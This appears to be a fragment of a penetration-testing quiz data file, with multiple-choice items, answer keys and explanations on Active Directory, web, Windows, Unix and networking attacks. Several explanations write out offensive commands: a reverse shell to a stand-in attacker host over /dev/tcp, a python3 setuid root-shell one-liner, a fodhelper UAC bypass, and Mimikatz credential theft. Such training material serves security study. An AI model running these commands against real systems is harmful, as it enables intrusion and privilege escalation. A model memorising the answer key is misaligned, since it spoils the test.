    {id:"1-104",domain:"ActiveDirectory",q:"A computer account has 'userAccountControl: 524288'. What does this value indicate?",opts:["The account is disabled; no security risk","524288 = TRUSTED_FOR_DELEGATION; unconstrained Kerberos delegation is enabled, allowing impersonation of any user to any service","The account has no password expiry; risk of stale credentials","524288 = the account is a domain controller"],ans:1,exp:"UAC value 524288 (0x80000) = TRUSTED_FOR_DELEGATION flag. Unconstrained delegation: when users authenticate to this service, the KDC puts a copy of the user's TGT into the TGS. The service can then impersonate the user to ANY other Kerberos service. If an attacker controls this machine, they can extract all TGTs from LSASS of users who authenticate to it."},
    {id:"1-105",domain:"ActiveDirectory",q:"BloodHound shows: UserA -> HasSession -> ComputerB -> AdminTo -> ComputerC. What does 'HasSession' indicate?",opts:["UserA has a logged-in session on ComputerB; compromising ComputerB allows stealing UserA's tokens or credentials from memory","UserA has a persistent service running on ComputerB maintaining a session","UserA has a cached credential on ComputerB stored in NTDS.dit","UserA's session is established via a trust relationship with ComputerB's domain"],ans:0,exp:"HasSession: BloodHound detected that UserA has an active logon session on ComputerB. If you compromise ComputerB (UserA → HasSession → ComputerB), you can use Mimikatz sekurlsa::logonpasswords or token impersonation to steal UserA's credentials, then use UserA's AdminTo → ComputerC to reach the next target. This is the core BloodHound attack path traversal."},
    {id:"1-106",domain:"ActiveDirectory",q:"'Pre-Windows 2000 Compatible Access' group contains 'Everyone'. What specific risk does this create?",opts:["All domain users have write access to all AD objects","Unauthenticated (anonymous) users can enumerate domain users, groups, and trusts via null sessions against AD","All users can create new computer accounts in the domain","Everyone group grants access to all file shares on domain-joined computers"],ans:1,exp:"The 'Pre-Windows 2000 Compatible Access' group grants read access to specific AD attributes for backward compatibility with NT4. When 'Everyone' is a member, unauthenticated users can perform null-session enumeration of AD objects — users, groups, trust relationships. A specific legacy misconfiguration still found in many enterprise AD environments."},
    {id:"1-107",domain:"ActiveDirectory",q:"An AD user has 'GenericAll' permission on another user object. What does this specifically allow?",opts:["Read all attributes including the password hash","Reset the target user's password WITHOUT knowing the current password, enabling direct account takeover","Add the target user to any security group in the domain","Enumerate all sessions of the target user across all domain computers"],ans:1,exp:"GenericAll = full control over the object. On a user object this includes: reset password (no current password required), modify group memberships, modify ACLs, disable the account. Password reset without knowing the current password is the most direct account takeover path. Use Set-ADAccountPassword or net user /domain."},
    {id:"1-108",domain:"ActiveDirectory",q:"Two-way transitive trust between DomainA.local and DomainB.local. Non-admin user compromised in DomainA. What is NOT automatically possible via the trust alone?",opts:["Authenticating to resources in DomainB that allow 'Authenticated Users' access","Enumerating users and groups in DomainB via LDAP","Gaining administrative access to DomainB without additional privilege escalation","Accessing shared resources in DomainB configured for cross-domain access"],ans:2,exp:"A two-way transitive trust means DomainA users CAN authenticate to DomainB. What they can ACCESS depends on their permissions. A non-admin user can: authenticate to DomainB, access 'Authenticated Users' resources, enumerate DomainB's AD. They CANNOT gain admin access just via the trust — they'd need to exploit a vulnerability or find a misconfigured resource in DomainB."},
    {id:"1-109",domain:"ActiveDirectory",q:"adminSDHolder in Active Directory: what is its security relevance?",opts:["Stores the hash of the domain administrator account for recovery","Permissions on adminSDHolder propagate every 60 minutes to all protected groups and members; misconfigured ACEs can grant persistent domain-level access","Controls GPO link order for domain controllers affecting security policy","Stores the KDC certificate used for PKINIT authentication"],ans:1,exp:"AdminSDHolder: its ACL is automatically propagated (by SDProp running every 60 minutes) to all members of protected groups (Domain Admins, Enterprise Admins, Schema Admins, etc.). If an attacker adds an ACE granting a compromised account GenericAll over protected users, that ACE persists and propagates every hour — a stealthy persistence mechanism surviving password resets."},
    {id:"1-110",domain:"Web",q:"Credentials sent via HTTP GET: 'http://app.com/login?user=admin&pass=secret'. Beyond interception in transit, what additional persistent risk exists?",opts:["GET parameters are processed server-side without logging, unlike POST","Credentials in GET parameters are recorded in server access logs, browser history, and proxy logs — creating persistent credential exposure","GET-based authentication is vulnerable to CSRF unlike POST-based forms","Server-side session tokens are embedded in GET parameters making them forgeable"],ans:1,exp:"GET parameters appear in: (1) server access logs (Apache/nginx log full URLs), (2) browser history and bookmarks, (3) Referer headers when navigating away (leaking to third-party sites), (4) proxy/CDN logs, (5) browser autocomplete. Even over HTTPS, credentials in URLs are a persistent exposure risk. POST parameters are not logged in standard access logs."},
    {id:"1-111",domain:"Networking",q:"Linux host with iptables blocking all inbound connections except SSH. Shell gained via SSH brute force. How to get a reverse shell to attacker despite inbound block?",opts:["Bind shell on a high-numbered port above the iptables rule range","Reverse shell connecting outbound from the target to the attacker's listener (outbound connections are not blocked)","UDP-based shell since iptables only blocks TCP by default","Encapsulate shell over SSH port forwarding"],ans:1,exp:"Outbound connections initiated FROM the target are not blocked by inbound iptables rules. A reverse shell (target connects to attacker:4444) uses an outbound connection from the target's perspective. The attacker runs 'nc -lvp 4444' and the payload does 'bash -i >& /dev/tcp/attacker/4444 0>&1'. This bypasses inbound firewall rules that only filter incoming connections."},
    {id:"1-112",domain:"Web",q:"Gobuster returns 403 for '/admin'. What does 403 indicate versus 404?",opts:["403 and 404 both indicate the path doesn't exist","403 (Forbidden) indicates the path EXISTS but access is denied; 404 (Not Found) means the path doesn't exist — 403 reveals the directory is present","403 indicates the WAF is blocking the request","403 indicates the server requires client certificate authentication"],ans:1,exp:"HTTP status codes: 403 Forbidden = resource EXISTS but client is not authorised. 404 Not Found = resource doesn't exist at this path. A 403 on /admin confirms an admin directory exists, even though access is denied. This is actionable — you know your target. Next steps: try default credentials, check for bypasses (/admin/, /ADMIN, /Admin)."},
    {id:"1-113",domain:"Web",q:"Subdomain 'old.client.com' has a CNAME pointing to an unclaimed cloud resource (AWS S3). What attack is possible?",opts:["DNS zone transfer to enumerate all client subdomains","Subdomain takeover: by claiming the resource on the cloud provider, an attacker can serve content under client.com's trusted domain","DNS cache poisoning to redirect traffic from old.client.com","BGP hijacking of the IP range associated with the cloud provider"],ans:1,exp:"Subdomain takeover: if old.client.com CNAME points to something.s3.amazonaws.com that is not claimed/registered, an attacker registers that S3 bucket and serves content from it. This content appears to come from old.client.com (trusted domain). Risks: phishing under a trusted domain, cookie theft if cookies are scoped to .client.com, malware distribution."},
    {id:"1-114",domain:"Windows",q:"A USB device plugged into a locked workstation automatically runs a payload. Which security feature was bypassed?",opts:["Windows Defender SmartScreen blocking untrusted application execution","AutoRun/AutoPlay restrictions (disabled by default on Windows 7+) or Device Guard preventing unsigned code execution","BitLocker preventing modification of the OS volume from external media","AppLocker preventing execution of payloads from removable media"],ans:3,exp:"AppLocker (with configured rules for removable media) or Device Guard/WDAC can prevent execution of code from USB drives. AutoRun is disabled by default on Windows 7+ (MS10-046 patch). The 'automatically installs and runs' scenario (HID-based attack device) would be blocked by AppLocker with removable device rules or WDAC."},
    {id:"1-115",domain:"Web",q:"'X-Frame-Options: SAMEORIGIN'. What attack does this specifically mitigate?",opts:["Cross-site scripting by preventing inline script injection","Clickjacking by preventing the page from being embedded in an iframe on a different origin","CSRF by blocking cross-origin form submissions","Open redirect by restricting navigation to same-origin URLs"],ans:1,exp:"X-Frame-Options: SAMEORIGIN instructs the browser to only allow the page to be framed by pages on the same origin. This prevents clickjacking attacks where an attacker frames your site in an invisible iframe to trick users into clicking UI elements. DENY would prevent all framing. Content-Security-Policy frame-ancestors is the modern equivalent."},
    {id:"1-116",domain:"Windows",q:"Code execution in a medium-integrity process, UAC enabled. Which technique abuses a COM object with auto-elevation to bypass UAC without a visible prompt?",opts:["Token manipulation using SeImpersonatePrivilege","fodhelper.exe UAC bypass: modifying HKCU registry key ms-settings shell handler that auto-elevates","Exploiting a signed Microsoft binary to inject a DLL into a high-integrity process","Using runas /noprofile /savecred to cache admin credentials without UAC prompt"],ans:1,exp:"fodhelper.exe has a 'requireAdministrator' and 'autoElevate:true' manifest. It reads from HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command before elevating. By writing to this registry key (writable by any user), when fodhelper auto-elevates, it reads and executes your payload as high-integrity without a UAC prompt. Classic UAC bypass."},
    {id:"1-117",domain:"Web",q:"SAML assertion: XML signature covers only the Assertion element, not the entire Response. What attack is possible?",opts:["XML injection by modifying unsigned elements within the Response","SAML response wrapping attack: injecting a malicious Assertion alongside the legitimate signed one; some parsers accept the attacker's unsigned assertion","Signature stripping attack: removing the signature entirely","Replay attack using the captured assertion across different service providers"],ans:1,exp:"SAML XML Signature Wrapping (XSW): when only the Assertion (not the Response) is signed, an attacker can copy the signed Assertion, inject a malicious unsigned Assertion with different attributes (e.g., admin role), and reposition the signed Assertion. Vulnerable parsers find the signed element (valid) but evaluate the attacker's unsigned element for authorisation decisions."},
    {id:"1-118",domain:"Unix",q:"Binary has 'cap_setuid+ep' set via getcap. Why is this equivalent to a SUID binary for privilege escalation?",opts:["Capabilities only apply to network operations; cap_setuid has no privilege escalation value","cap_setuid+ep allows the binary to call setuid(0) to change its effective UID to root, achieving root-level code execution","Capabilities are sandboxed and cannot escape the process namespace","cap_setuid only allows changing to UIDs below 1000, not to root"],ans:1,exp:"Linux capabilities are fine-grained alternatives to SUID. cap_setuid = ability to make setuid() syscalls. +ep = both Effective (active) and Permitted sets. A binary with cap_setuid+ep can call setuid(0) even as a non-root user. Python3 example: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' — achieves root shell if python3 has cap_setuid+ep."},
    {id:"1-119",domain:"Methodology",q:"A junior tester argues a properly configured WAF makes SQL injection remediation in application code unnecessary. What is the fundamental flaw?",opts:["WAFs cannot detect SQL injection; only IDS systems can","WAFs can be bypassed through encoding/fragmentation/novel payloads; the underlying vulnerability remains; defence in depth requires fixing the root cause (parameterised queries) not just adding perimeter controls","WAFs introduce latency reducing security by creating a DoS risk","SQL injection only affects databases; WAFs protect the web tier so they are complementary"],ans:1,exp:"WAFs are supplementary controls, not replacements for secure coding. They can be bypassed (encoding tricks, comment insertion, fragmentation, HTTP smuggling, novel payloads). The underlying vulnerability is in the application code. Defence in depth: fix the code (parameterised queries) AND add WAF AND apply least-privilege database accounts. WAF alone is never sufficient."},
    {id:"1-120",domain:"Unix",q:"A Linux binary has 'cap_setuid+ep' and a tester runs: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'. What is the key prerequisite for a root shell?",opts:["Python's os module must be imported as root for setuid to work","The binary (python3) must have cap_setuid in its effective capability set; the setuid(0) call then succeeds even as a non-root user","The -p flag must be passed to maintain privileges during setuid","The binary must be owned by root with SUID bit set in addition to the capability"],ans:1,exp:"Linux capabilities on binaries: cap_setuid+ep means the binary starts with cap_setuid in BOTH Effective (active by default) and Permitted sets. os.setuid(0) calls the setuid() syscall with UID 0. The kernel checks: does the process have cap_setuid in its effective set? Yes. The call succeeds, real UID becomes 0. /bin/bash -p preserves the effective UID → root shell."}
  ]
};
